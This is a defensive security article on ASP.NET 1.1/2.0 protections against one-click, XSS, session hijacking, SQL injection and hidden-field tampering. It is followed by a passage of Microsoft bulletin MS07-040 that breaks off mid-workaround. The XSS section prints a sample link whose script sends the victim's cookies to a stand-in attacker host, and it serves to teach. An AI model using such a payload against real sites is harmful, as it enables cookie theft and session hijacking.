## What ASP.NET Developers Should Always Do

If you're reading this article, you probably don't need to be lectured about the growing importance of security in Web applications. You're likely looking for some practical advice on how to implement security in ASP.NET applications. The bad news is that no development platformâincluding ASP.NETâcan guarantee you'll be writing 100-percent secure code once you adopt itâwho tells that, just lies. The good news, as far as ASP.NET is concerned, is that ASP.NET, especially version 1.1 and the coming version 2.0, integrates a number of built-in defensive barriers, ready to use.

The application of all these features alone is not sufficient to protect a Web application against all possible and foreseeable attacks. However, combined with other defensive techniques and security strategies, the built-in ASP.NET features form a powerful toolkit to help ensure that applications operate in a secure environment.

Web security is the sum of various factors and the result of a strategy that goes well beyond the boundaries of the individual application to involve database administration, network configuration, and also social engineering and phishing.

The goal of this article is to illustrate what ASP.NET developers should always do in order to keep the security bar reasonably high. That's what security is mostly aboutâkeep the guard up, never feel entirely secure, and make it harder and harder for the bad guys to hack.

Let's see what ASP.NET has to offer to simplify the job.

## Where the Threats Come From

In Table 1, I've summarized the most common types of Web attacks and flaws in the application that can make them succeed.

| Attack | Made possible by . . . |
| --- | --- |
| Cross-site scripting (XSS) | Untrusted user input echoed to the page |
| SQL injection | Concatenation of user input to form SQL commands |
| Session hijacking | Session ID guessing and stolen session ID cookies |
| One-click | Unaware HTTP posts sent via script |
| Hidden field tampering | Unchecked (and trusted) hidden field stuffed with sensitive data |

**Table 1. Common Web attacks**

What are the key facts that emerge from the list? At least the following three, I'd say:

* Whenever you insert any sort of user input into the browser's markup, you potentially expose yourself to a code injection attack (any variations of SQL injection and XSS).
* Database access must be accomplished securely, that is, using the least set of permissions ever possible for accounts and delimiting the individual user's responsibility through roles.
* Sensitive data should never be sent across the wire (let alone as clear text) and must be stored safely on the server.

It is interesting to note that the three points above address three distinct aspects of Web security, the combination of which is the only reasonable way to build a bulletproof and tamper-resistant application. The facets of Web security can be summarized as follows:

* Coding practices: data validation, type and buffer length checking, anti-tampering measures
* Data access strategies: use roles to ensure the weakest possible account, use stored procedures or at least parameterized commands
* Effective storage and administration: do not send critical data down to the client, use hash codes to detect manipulation, authenticate users and protect identities, apply rigorous policies for passwords

As you can see, a secure application can result only from the combined efforts of developers, architects, and administrators. Don't assume you can get it right otherwise.

When writing ASP.NET applications you're not left on your own to fight against the army of hackers, armed only with your brains, skills, and fingers to type lines of code. ASP.NET 1.1 and later helps with a few specific features that raise automatic barriers against some of the threats listed above. Let's review them in detail.

## ViewStateUserKey

Introduced with ASP.NET 1.1, **ViewStateUserKey** is a string property on the **Page** class that only few developers admit to be familiar with. Why? Let's read what the documentation has to say about it.

> Assigns an identifier to an individual user in the view state variable associated with the current page

In spite of the convoluted style, the sentence is fairly clear; but can you honestly say it explains the intended purpose of the property? To understand the role of **ViewStateUserKey**, you need to read a little further, until you arrive at the *Remarks* section.

The property helps you prevent one-click attacks by providing additional input to create the hash value that defends the view state against tampering. In other words, **ViewStateUserKey** makes it much harder for hackers to use the content of the client-side view state to prepare malicious posts against the site. The property can be assigned any non-empty string, preferably the session ID or the user's ID. To better understand the importance of this property, let's briefly review the basics of the **one-click** attack.

A one-click attack consists in posting a malicious HTTP form to a known, vulnerable Web site. It is called "one-click" because it usually begins with an unaware victim clicking on an alluring link received through e-mail or found when navigating a crowded forum. By following the link, the user inadvertently triggers a remote process that ends up submitting the malicious <form> to a site. Be honest: can you say you never followed a link like *Click here to win $1,000,000* just to see what happens? Apparently, nothing bad happened to you. Let's assume this is correct; can you say the same for all the rest of the Web community? Who knows.

To be successful, a one-click attack requires certain background conditions:

* The attacker must know a lot about the vulnerable site. This can happen because the attacker "diligently" studied the file, or because he/she is an angry internal (for example, a fired and dishonest employee). For this reason, the attack might potentially be devastating.
* The site must be using cookies (better if persistent cookies) to implement single sign-on, and the attacker should have received a valid authentication cookie.
* Certain users of the site are involved in sensitive transactions.
* The attacker must have access to the target page.

As mentioned, the attack consists in submitting a malicious HTTP form to a page that expects a form. Reasonably, this page will be consuming posted data to perform some sensitive operation. Reasonably, the attacker knows exactly how each field will be used and can come up with some spoofed values to reach his goal. It's usually a targeted attack, and it is also hard to track back because of the triangular trade that it establishesâthe hacker induces a victim to click a link on the hacker's site, which in turn will post the bad code to a third site. (See Figure 1.)

![ms972969.securitybarriers01(en-us,MSDN.10).gif](images/ms972969.securitybarriers01(en-us,msdn.10).gif "ms972969.securitybarriers01(en-us,MSDN.10).gif")

**Figure 1. The one-click attack**

Why an unsuspecting victim? Because, in this way server logs show that the IP address where the bad request originated is the victim's IP address! As mentioned, this attack is not as common (and easy to arrange) as a "classic" XSS; however, its nature makes it potentially devastating. What's the cure for it? Let's review the mechanics of the attack in the ASP.NET context.

Unless the action is coded in the **Page\_Load** event, there's no way an ASP.NET page can execute sensitive code outside a postback event. For a postback event to take place, the view state field is mandatory. Bear in mind that ASP.NET checks the postback state of a request and sets **IsPostBack** accordingly, based on the presence of the \_VIEWSTATE input field. So whoever wants to send a bogus request to an ASP.NET page must necessarily provide a valid view state field.

For the one-click attack to work, the hacker must have had access to the page. When this happened, the far-sighted hacker saved the page locally. So now he/she can access the \_VIEWSTATE field and use that to create a request with the old view state and malicious values in other fields. The question is, will this work?

Why not? If the attacker can provide a valid authentication cookie, the hacker gets in and the request is regularly processed. The view state contents is not checked at all on the server (when **EnableViewStataMac** is off), or is only checked against tampering. By default, there's nothing in the view state that ties that content to a particular user. The attacker can easily reuse the view state obtained making legal access to the page to build a bogus request on behalf of another user. That's where **ViewStateUserKey** fits in.

If accurately chosen, the property adds user-specific information to the view state. When the request is processed, ASP.NET extracts the key from the view state and compares it against the **ViewStateUserKey** of the running page. If the two match, the request is considered legitimate; otherwise an exception is thrown. What's a valid value for the property?

Setting **ViewStateUserKey** to a constant stringâthe same for all usersâis like leaving it blank. You must set it to something that varies for each userâuser ID or, better yet, session ID. For a number of technical and social reasons, session ID is a much better fit because a session ID is unpredictable, times out, and varies on a per-user basis.

Here's the code you need to have in all of your pages:

```
void Page_Init (object sender, EventArgs e) {
   ViewStateUserKey = Session.SessionID;
   :
}

```

To avoid writing this over and over again, you can bolt it in the **OnInit** virtual method of the **Page**-derived class. (Note that you must set this property in the **Page.Init** event.)

```
protected override OnInit(EventArgs e) {
   base.OnInit(e);
   ViewStateUserKey = Session.SessionID;
}

```

Overall, using a base page class is always a good thing, as I explain in my article, [Build Your ASP.NET Pages on a Richer Bedrock](https://msdn.microsoft.com/en-us/library/ms379557%28v%3Dmsdn.10%29). An excellent article to learn more about the tactics of one-click attackers can be found on [aspnetpro.com](http://www.aspnetpro.com/features/2004/08/asp200408er_f/asp200408er_f.asp).

## Cookies and Authentication

Cookies exist because they can help developers to achieve results. Cookies operate as a sort of persistent link between browser and server. Especially for applications using single sign-on, a stolen cookie is just what makes the attack possible. This is certainly the case with one-click attacks.

To use cookies, you don't have to explicitly create and read them programmatically. You implicitly use cookies if you use session state and if you implement forms authentication. Sure, ASP.NET supports cookieless session state and ASP.NET 2.0 also introduces cookieless forms authentication. So you could in theory use those functionalities without using cookies. I'm not saying you don't have to, but this is just one of the cases in which the remedy can be even worse than the disease. Cookieless sessions, in fact, embed the session ID in the URL making it visible to everybody.

What are the potential problems connected to the use of cookies? Cookies can be stolen (that is, copied to the hacker's machine) and poisoned (that is, filled with malicious data). These actions are often the prelude to an incoming attack. If stolen, authentication cookies "authorize" external users to connect to the application (and use protected pages) on behalf of you, potentially enabling hackers to happily bypass authorization and themselves do whatever roles and security settings allow the victim to do. For this reason, authentication cookies are normally given a relatively short lifetimeâ30 minutes. (Note that the cookie expires even if the browser's session takes longer to complete.) In case of theft, hackers have a 30-minute window to try the attack.

This window can be enlarged to save users from having to log on too frequently; be aware that you do this at your own peril. In any case, avoid using ASP.NET persistent cookies. That would make the lifetime of the cookie virtually perennial, as long as 50 years! The following code snippet shows how to modify the expiration of the cookie at leisure.

```
void OnLogin(object sender, EventArgs e) {
   // Check credentials
   if (ValidateUser(user, pswd)) {
      // Set the cookie's expiration date
      HttpCookie cookie;
      cookie = FormsAuthentication.GetAuthCookie(user, isPersistent);
      if (isPersistent)
         cookie.Expires = DateTime.Now.AddDays(10);

      // Add the cookie to the response
      Response.Cookies.Add(cookie);

      // Redirect
      string targetUrl;
      targetUrl = FormsAuthentication.GetRedirectUrl(user, isPersistent);
   Response.Redirect(targetUrl);
   }
}
```

You might want to use this code in your own login forms to fine-tune the lifetime of authentication cookies.

## Session Hijacking

Cookies are also used to retrieve the session state for a particular user. The ID of the session is stored to a cookie that travels back and forth with the request and is stored on the browser's machine. Again, if stolen the session cookie can be used to get a hacker into the system and access someone else's session state. Needless to say, this can happen as long as the specified session is activeâusually, no more than 20 minutes. An attack conducted through a spoofed session state is known as *session hijacking*. For more details on session hijacking, read [Theft On The Web: Prevent Session Hijacking](https://www.microsoft.com/technet/technetmag/issues/2005/01/sessionhijacking/default.aspx).

How dangerous can this attack be? Hard to say. It depends on what the Web site does and, more importantly, how its pages are designed. For example, imagine you've been able to get someone else's session cookie and attach it to a request to a page on the site. You load the page and work through its ordinary user interface. There's no code you can inject in the page and nothing in the page that you can alter, except that the page now works using the session state of another user. This is not bad per se, but may lead hackers straight to a successful exploit as long as the information in the session is sensitive and critical. Look, the hacker can't snoop into the content of the session store, but what's stored in it is used as if the hacker legitimately entered it. For example, imagine an e-commerce application where users add items to a shopping cart as they navigate through the site.

* **Scenario #1.** The content of the shopping cart is stored in the session state. However, upon check-out, the user is requested to confirm and enter payment details over a secure SSL connection. In this case, plugging into another user's session state only allows the hacker to learn some details about the shopping preferences of the victim. No sort of damage really results from hijacking in this context. Only confidentiality is at risk.
* **Scenario #2.** The application handles a profile for each registered user and stores the profile in the session state. Alas, the profile (as might be the case) includes credit card information. Why store user profile details into the session? Perhaps one of the application's goals is ultimately to save users from typing their credit card and bank information over and over again. So upon checkout, the application navigates the user to a page with pre-filled fields. Improvidently, one of these fields is the credit card number taken from the session state. Can you now guess the end of the story?

The design of the application's page is key to preventing session hijacking attacks. Two points remains open, though. The first is, what can you do to prevent cookie theft? The second is, what can ASP.NET do to detect and block hijacking?

The ASP.NET session cookie is extremely simple and is limited to contain the sole session ID string. The ASP.NET runtime extracts the session ID from the cookie and checks it against the active sessions. If the ID is valid, ASP.NET connects to the corresponding session and continues. This behavior greatly simplifies life for hackers who have stolen, or can guess, a valid session ID.

XSS and man-in-the-middle attacks, as well as brute access to a client PC, are all ways to get a valid cookie. To prevent thefts, you should implement security best practices to prevent XSS, and all of its variations, from succeeding.

To prevent session ID guessing, instead, you should simply avoid overrating your skills. Guessing a session ID means that you know a way to predict a valid session ID string. Given the algorithm used by ASP.NET (15 random numbers mapped to URL-enabled characters), your chance to guess a valid ID by chance approaches zero. There's no reason I can think of to replace the default session ID generator with your own. In many cases, you only make life easier for attackers.

What's worse about session hijacking is that once a cookie has been stolen or guessed there's not much ASP.NET can do to detect the fraudulent use of the cookie. Again, the reason is that ASP.NET limits itself to checking the validity of the ID and questions the place of origin of the cookie.

My Wintellect pal Jeff Prosise wrote an excellent article on session hijacking for [MSDN Magazine](https://msdn.microsoft.com/msdnmag/issues/04/08/wickedcode/default.aspx). His conclusions offer little comfortâit's virtually impossible to build a foolproof defense against attacks that rely on stolen session ID cookiesâbut the code he developed offers a smart tip to raise the security bar even higher. Jeff created a HTTP module that monitors incoming requests and outgoing responses for session ID cookies. The module appends a hash code to outgoing session IDs that would make it harder for the attacker to reuse that cookie. You can read details [here](https://msdn.microsoft.com/msdnmag/issues/04/08/wickedcode/default.aspx).

## EnableViewStateMac

The view state is used to persist the state of controls across two successive requests for the same page. By default, the view state is Base64-encoded and signed with a hash value to prevent tampering. Unless you change default page settings, the view state is not at risk of tampering. If an attacker modifies the view state, or even if he/she rebuilds the view state using the right algorithm, ASP.NET catches the attempt and throws an exception. A tampered view state is not necessarily harmfulâit modifies the state of server controls, thoughâbut can become the vehicle of serious infections. For this reason, it is of extreme importance that you *do not* remove the machine authentication code (MAC) cross-checking that takes place by default. See Figure 2.

![ms972969.securitybarriers02(en-us,MSDN.10).gif](images/ms972969.securitybarriers02(en-us,msdn.10).gif "ms972969.securitybarriers02(en-us,MSDN.10).gif")

**Figure 2. What makes the view state inherently tamper-resistant when EnableViewStateMac is enabled**

When MAC checking is enabled (which is the default), the serialized view state is appended a hash value that results from some server-side values and the view state user key, if any. When the view state is posted back, the hash value is computed again using fresh server-side values and compared to the stored value. If the two match, the request is allowed; otherwise, an exception is thrown. Even assuming the hacker has the skills to crack and rebuild the view state, he/she needs to know server-stored values to come up with a valid hash. Specifically, the hacker needs to know the machine key referenced in the <**machineKey**> entry of machine.config.

By default, the **<machineKey>** entry is autogenerated and physically stored in the Windows **Local Security Authority** (LSA). Only in case of Web farmsâwhen the view state's machine keys must be the same on all machinesâshould you specify it as clear text in the machine.config file.

View state MAC checking is controlled through a **@Page** directive attribute named **EnableViewStateMac**. As mentioned, it is set to true by default. Never ever disable it; it would make view state tampering one-click attacks possible and with great chances of success.

## ValidateRequest

Cross-site scripting (XSS) is an old-acquaintance for many seasoned Web developersâit's around since 1999 or so. Simply put, XSS exploits holes in the code to introduce a hacker's executable code into another user's browser session. Executed, the injected code can perform a variety of actionsâgrab cookies and upload a copy to a hacker's controlled Web site, monitor the user's Web session and forward data, modify the behavior and appearance of the hacked page giving incorrect information, even make itself persistent, so that the next time the user returns to the page, the fraudulent code runs again. Read in more detail about the basics of a XSS attack in the TechNet article [Cross-site Scripting Overview](https://www.microsoft.com/technet/security/news/csoverv.mspx).

What loopholes in the code make XSS attacks possible?

XSS exploits Web applications that dynamically generate HTML pages and don't validate the input echoed to the page. *Input* here means the contents of query strings, cookies, and form fields. If this content goes online without proper sanity checks, there's the risk that hackers can manipulate it to execute malicious script in client browsers. (After all, the aforementioned one-click attack is a recent variation of XSS.) A typical XSS attack entails that the unsuspecting user follows a luring link that embeds escaped script code. The fraudulent code is sent to a vulnerable page that trustfully outputs it. Here's an example of what can happen:

```
<a href="http://www.vulnerableserver.com/brokenpage.aspx?Name=
<script>document.location.replace(
'http://www.hackersite.com/HackerPage.aspx?
Cookie=' + document.cookie);
</script>">Click to claim your prize</a>

```

The user clicks on an apparently safe link and ends up passing to a vulnerable page a piece of script code that first gets all the cookies on the user's machine and then sends them to a page on the hacker's Web site.

It is important to note that XSS is not a vendor-specific issue and doesn't necessarily exploit holes in Internet Explorer. It affects every Web server and browser currently on the market. Even more important, note that there's no single patch to fix it. You can surely protect your pages from XSS, you do so by applying specific measures and sane coding practices. In addition, be aware that the attacker doesn't need the user to click a link in order to start the attack.

To defend against XSS, you must primarily determine which input is valid and reject all the rest. A detailed checklist for foiling XSS attacks can be found in the book that is a required reading at Microsoftâ[Writing Secure Code](https://www.microsoft.com/mspress/books/5957.asp) by Michael Howard and David LeBlanc. In particular, I suggest you take a careful look at Chapter 13.

The primary way to thwart insidious XSS attacks is to add a well-done and solid validation layer to your inputâany type of input data. For example, there are [circumstances](https://weblogs.asp.net/vga/archive/2003/05/02/6329.aspx) in which even an otherwise innocuous colorâa RGB tripletâcan bring uncontrolled script straight to the page.

In ASP.NET 1.1, when turned on, the **ValidateRequest** attribute on the **@Page** directive checks that users are not sending potentially dangerous HTML markup in query strings, cookies, or form fields. If that is detected, an exception is thrown and the request aborts. The attribute is on by default; you don't have to do anything to be protected. If you want to allow HTML markup to pass, then you must actively disable it.

```
<%@ Page ValidateRequest="false" %>

```

**ValidateRequest** is *not* the silver bullet and can't replace an effective validation layer. Read [here](https://weblogs.asp.net/vga/archive/2003/05/02/6329.aspx) to get a lot of valuable information on how the feature really works under the hood. It basically applies a regular expression to catch a few potentially harmful sequences.

> **Note** The **ValidateRequest** feature was originally [flawed](http://www.securityfocus.com/bid/8562/discussion/); you need to apply a [patch](https://weblogs.asp.net/gad/archive/2003/11/12/37219.aspx) for it to work as expected. This is valuable information that has often passed unnoticed. Strangely enough, I myself found one of my machines still affected by the flaw. Check it out!

There's no reason for not keeping **ValidateRequest** on. You can disable it, but you must have a very good reason; one of which could be the user requirement of being able to post some HTML to the site for gaining better formatting options. In this case, you should limit the number of allowed HTML tags (**<pre>**, **<b>**, **<i>**, **<p>**, **<br>**, **<hr>**) and write a regular expression that ensures that nothing else is allowed or accepted.

Here are a few more tips that help protect ASP.NET applications from XSS:

* Use **HttpUtility.HtmlEncode** to convert dangerous symbols to their HTML representation.
* Use double quotes instead of single quotes, as HTML encoding only escapes double quotes.
* Force a codepage to limit the number of characters that can be used.

In summary, use, but do not fully trust, the **ValidateRequest** attribute and don't be too lazy. Spend some time to understand security threats like XSS at their roots and plan a defensive strategy centered on one key pointâconsider all user input evil.

## Database Perspective

SQL injection is another well-known type of attack that exploits applications that use unfiltered user input to form database commands. If the application blissfully uses what the user types in a form field to create a SQL command string, it exposes you to the risk that a malicious user may simply access the page and enter fraudulent parameters to modify the nature of the query. You can learn more about SQL injection [here](http://www.spidynamics.com/whitepapers/whitepapersqlinjection.pdf).

There are many ways in which you can thwart a SQL injection attack. Here are the most common techniques.

* Ensure that any user input is of the proper type and follows the expected pattern (zip code, SSN, e-mail address). If you expect a number from a textbox, block the request if the user enters something that cannot be converted to a number.
* Use parameterized queries or, better yet, stored procedures.
* Use SQL Server permissions to limit the things each user can do on the database. For example, you might want to disable xp\_cmdshell or limit it to administrators.

If you use stored procedure you significantly reduce the attack surface. With stored procedures, in fact, you don't need to compose SQL strings dynamically. In addition, any parameters are validated in SQL Server against the specified types. While this alone isn't a 100-percent secure technique, combined with validation it will make you more secure.

It is even more important to ensure that only authorized users perform potentially devastating operations like dropping tables. This requires a careful design of the middle-tier of the application. A good technique, and not just because of security, is to focus on roles. You group users in roles and define an account for each role with the least set of permissions.

A few weeks ago, the Wintellect Web site was under attack through a sophisticated form of SQL injection. The hacker attempted to create and launch an FTP script to download a (malicious?) executable. It was our good luck that the attack failed. Or was it rather strong input validation, use of stored procedures, and use of SQL Server permissions that prevented the attack from working?

To summarize, follow these guidelines to avoid unwanted injections of SQL code:

* Run with least privileges and never execute code as "sa".
* Restrict access to built-in stored procedures.
* Favor SQL parameterized queries.
* Do not build statements via string concatenation and do not echo database errors.

## Hidden Fields

In classic ASP, hidden fields are the only way to persist data between requests. Any data you need to retrieve on the next request is packed into a hidden **<input>** field and round-tripped. What if on the client someone modifies the values stored in the field? The server-side environment has no way to figure it out so long as the text is clear. The ASP.NET **ViewState** property for pages and individual controls serves two purposes. On the one hand, the **ViewState** is the means to persist state across requests; on the other hand, the **ViewState** allows you to store custom values in a protected, tamper-resistant hidden field.

As shown in Figure 2, the view state is appended a hash value that gets checked on each and every request to detect tampering. There's no reason for using hidden fields in ASP.NET except in a few cases. The view state does the same in a much more secure way. Said upfront that storing sensitive values such as prices or credit card details in a clear hidden field is like leaving the door open to hackers, the view state would even make this bad practice less dangerous than before because of its data protection mechanism. However, bear in mind that the view state prevents tampering with but doesn't guarantee confidentiality unless you encrypt itâso credit card details stored in the view state are anyway at risk.

When is it acceptable to use hidden fields in ASP.NET? When you're building custom controls that need to send data back to the server. For example, imagine you create a new **DataGrid** control that supports column reordering. You need to pass the new order back to the server on postbacks. Where else can you store this information, if not into a hidden field?

If the hidden field is a read/write fieldâthat is, the client is expected to write to itâthere's not much you can do that is hacker-proof. You can try to hash or cipher the text, but this wouldn't give you any reasonable certainty of not being hacked. The best defense here is to make the hidden field contain inert and harmless information.

This said, it is worthwhile to note that ASP.NET exposes a little known class that can be used to encode and hash any serialized object. The class is **LosFormatter** and is the same class used by the **ViewState** implementation to create the encoded text round-tripped to the client.

```
private string EncodeText(string text) {
  StringWriter writer = new StringWriter();
  LosFormatter formatter = new LosFormatter();
  formatter.Serialize(writer, text);
  return writer.ToString();
}
```

The preceding code snippet shows how to use **LosFormatter** to create view state-like content, encoded and hashed.

## E-mails and Spam

To end this article, let me point out that at least two of the most common attacksâclassic XSS and one-clickâare often conducted by inducing unsuspecting victims to click on alluring and spoofed links. Many times we find such links directly in our inbox, anti-spam filters notwithstanding. Volumes of e-mail addresses can be bought for a few dollars. One of the main techniques used to build such lists is scanning public pages on Web sites looking for, and grabbing, anything that looks like an e-mail address.

If a page displays an e-mail address, the chances are good that sooner or later it will be caught by Web robots. Really? Well, it much depends on how you display the e-mail address. If you hardcode it, you're lost. If you resort to alternative representations such as *dino-at-microsoft-dot-com*, it's not clear if you really fool a Web robot; for sure, you will irritate any human reading your page who wants to establish a legitimate contact.

Overall, you should figure out a way to dynamically generate the email address as a **mailto** link. This is exactly what a free component written by Marco Bellinaso does. You can get it with full source code from the [DotNet2TheMax](http://www.dotnet2themax.com/showcontent.aspx?id=f23aa16e-5b72-42a2-b2f6-76695cbbdfa7) Web site.

## Summary

Does anyone doubt that the Web is probably the most hostile of all runtime environments? It comes from the fact that everybody can access a Web site and try to pass it good and bad data. However, would it really make sense to create a Web application that doesn't accept user input?

So let's face it: no matter how strong your firewall is, and how frequently you apply available patches, if you're running an inherently vulnerable Web application, sooner or later attackers will walk straight to the heart of your systems through the main entrance, namely port 80.

ASP.NET applications are neither more vulnerable nor more secure than other Web applications. Security and vulnerability both derive from coding practices, experience from the field, and teamwork. No application is secure if the network isn't; likewise, no matter how secure and well administered the network is, attackers will always find their way if the application is broken.

The beauty of ASP.NET is that it provides you with a few good tools to raise the security bar to a passable level with a few clicks. It is *not* a sufficient level, though. Do not rely on ASP.NET built-in solutions aloneâbut neither should you ignore them. And learn as much as possible about most common attacks.

This article provides an annotated list of built-in features and some background about attacks and defenses. Techniques for detecting ongoing attacks are another story, and perhaps require another article.

# Microsoft Security Bulletin MS07-040 - Critical

## Vulnerabilities in .NET Framework Could Allow Remote Code Execution (931212)

Published: July 10, 2007 | Updated: May 07, 2009

**Version:** 4.0

### General Information

#### Executive Summary

This update resolves three privately reported vulnerabilities. Two of these vulnerabilities could allow remote code execution on client systems with .NET Framework installed, and one could allow information disclosure on Web servers running ASP.NET. In all remote code execution cases, users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

This security update addresses two vulnerabilities by modifying the way .NET Framework addresses buffer allocation. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

**Recommendation:** Microsoft recommends that customers apply the update immediately.

**Known Issues:** [Microsoft Knowledge Base Article 931212](https://support.microsoft.com/kb/931212) documents the currently known issues that customers may experience when they install this security update. The article also documents recommended solutions for these issues.

#### Affected and Non-Affected Software

In the following tables of affected and non-affected software, software versions that are not listed are past their support lifecycle. To determine the support lifecycle for your product and version, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

## Frequently Asked Questions (FAQ) Related to This Security Update

**Why was this Bulletin revised on April 22, 2008?**

This Bulletin was revised adding .NET Framework 1.0 (KB928367), .NET Framework 1.1 (KB928366), and .NET Framework Version 2.0 (KB928365) as affected components for Windows XP Service Pack 3. This is a detection update only. There were no changes to the binaries. Customers with Windows XP who have already installed the security update for .NET Framework 1.0, .NET Framework 1.1, and .NET Framework Version 2.0 will not need to reinstall the update after applying Windows XP Service Pack 3.

**Why was this Bulletin revised on March 25, 2008?**

This Bulletin was revised adding .NET Framework 1.0 (KB928367) and .NET Framework 1.1 (KB929729) as affected components for Windows Vista Service Pack 1 and Windows Server 2008. Customers with Windows Vista who have already installed the security update for .NET Framework 1.0 and .NET Framework 1.1 will not need to reinstall the update after applying Windows Vista Service Pack 1. By default, Windows Server 2008 does not include .NET Framework 1.0 or .NET Framework 1.1. Customers will only need to apply the update on Windows Server 2008 systems that have independently installed .NET Framework 1.0 or .NET Framework 1.1.

**This security bulletin says that .NET Framework 3.0 is non-affected. How does .NET Framework 3.0 relate to the previous versions that are affected?**

Microsoft .NET Framework 3.0 is a superset of .NET Framework 2.0. Microsoft .NET Framework 3.0 listed as Non-Affected Software in this security update refers to the four new technologies added as the superset to the .NET Framework 2.0. These technologies are: Windows Presentation Foundation (WPF), Windows Workflow Foundation (WF), Windows Communication Foundation (WCF), and Windows CardSpace. The vulnerabilities addressed in this security update do not affect any of the four specific .NET Framework 3.0 technologies. Developers wishing to learn more about the .NET Framework 3.0 and itâs relation to previous version may refer to the following [.NET Framework 3.0 Versioning and Deployment MSDN article](https://msdn2.microsoft.com/netframework/aa663314.aspx). Additional information for .NET Framework 3.0 may also be found in the following [MSDN article](https://msdn2.microsoft.com/netframework/aa663309.aspx).

**I only have .NET Framework 3.0 installed. Why am I being offered the security update?**

There is no security update targeting the WPF, WF, WCF, and CardSpace technologies that together make up Microsoft .NET Framework 3.0 as they are not affected by any of the vulnerabilities in this security update. However, every installation of Microsoft .NET Framework 3.0 also includes .NET Framework 2.0, which is an affected product in this security update and as such this update is offered to all systems where applicable.

**What are the known issues that customers may experience when they install this security update?**

[Microsoft Knowledge Base Article 931212](https://support.microsoft.com/kb/931212) documents the currently known issues that customers may experience when they install this security update. The article also documents recommended solutions for these issues.

**Does this update contain any security-related changes to functionality?**

Yes. In addition to the changes that are listed in the âVulnerability Informationâ section of this bulletin, this update includes a defense-in-depth change to ASP.NET. This defense-in-depth change mitigates the issue reported publicly and assigned the Common Vulnerability and Exposure number [CVE-2006-7192](https://www.cve.org/CVERecord?id=CVE-2006-7192).

ASP.NET developed Web applications using the ASP.NET request validation feature can not replace an effective validation layer restricting untrusted input variables. Developers wishing to learn more about the security features that ASP.NET provides Web applications may refer to the following [MSDN article](https://msdn2.microsoft.com/library/ms972969.aspx).

**How do I know if my ASP.NET Web application is vulnerable to this issue?**

ASP.NET developed Web applications that restrict all untrusted input variables to a range of expected values or characters would not be affected. For more information on hardening ASP.NET Web applications see [Microsoft Knowledge Base Article 815155](https://support.microsoft.com/kb/815155).

**Does this update contain any changes to functionality?**

Yes. Besides the changes that are listed in the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the bulletin section, Vulnerability Information, this update includes changes not related to security. In addition to known issues related to this security update, [Microsoft Knowledge Base Article 931212](https://support.microsoft.com/kb/931212) documents functionality changes introduced in this .NET Framework security update.

**Why does this update contain functionality changes that are non-security related?**

All .NET Framework updates are cumulative, meaning security updates released may include functionality changes that have yet to be released in the next scheduled servicing method, such as a service pack.

**Why was this bulletin updated with service pack information for the affected .NET Framework versions?**

This bulletin was updated to provide additional clarification on the supported versions of the .NET Framework and which service packs apply to the affected products. Customers who have not installed a supported version of the .NET Framework will not be offered this update. Customers should upgrade the .NET Framework version on their system to a supported service pack before attempting to apply this update.

For additional information on the .NET Framework versions and their supported service packs, see [Lifecycle Supported Service Packs](https://support.microsoft.com/gp/lifesupsps).

**Why does this update address several reported security vulnerabilities?**

This update contains support for several vulnerabilities because the modifications that are required to address these issues are located in related files. Instead of having to install several updates that are almost the same, customers need to install this update only.

**I am using an older version of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin has been tested to determine which versions are affected. Other versions are past their support life cycle. To determine the support life cycle for your product and version, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

## .NET PE Loader Vulnerability - CVE-2007-0041:

A remote code execution vulnerability exists in .NET Framework that could allow an attacker who successfully exploited this vulnerability to make changes to the system with the permissions of the logged-on user. If a user is logged in with administrative user rights, an attacker could take complete control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2007-0041](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2007-0041).

#### Mitigating Factors for .NET PE Loader Vulnerability - CVE-2007-0041:

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker would have to host a Web site that contains a Web page that is used to exploit this vulnerability. An attacker would have no way to force users to visit a specially crafted Web site. Instead, an attacker would have to convince them to visit the Web site, typically by getting them to click a link that takes them to the attacker's Web site. After they click the link, they would be prompted to perform several actions. An attack could only occur after they performed these actions.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps reduce the number of successful attacks that exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail. However, if a user clicks on a link within an e-mail, they could still be vulnerable to this issue through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 runs in a restricted mode that is known as [Enhanced Security Configuration](https://msdn.microsoft.com/library/default.asp?url=/workshop/security/szone/overview/esc_changes.asp). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that have not been added to Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.
* .NET Framework 1.0 is not included in supported editions of Windows with the exception of the following:
  + Windows XP Tablet PC Edition 2005
  + Windows XP Media Center Edition 2005
* .NET Framework 1.1 is not included in supported editions of Windows with the exception of the following:
  + Windows Server 2003 Service Pack 1
  + Windows Server 2003 Service Pack 2
* .NET Framework 2.0 is not included in supported editions of Windows with the exception of the following:
  + Windows Vista and Windows Vista Service Pack 1
  + Windows Vista x64 Edition and Windows Vista x64 Edition Service Pack 1

#### Workarounds for .NET PE Loader Vulnerability - CVE-2007-0041:

Microsoft has tested the following workarounds. Although these workarounds will not correct the underlying vulnerability, they help block known attack vectors. When a workaround reduces functionality, it is identified in the following section.

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones.**

  You can help protect against this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls. You can do this by setting your browser security to **High**.

  To raise the browsing security level in Microsoft Internet Explorer, follow these steps:

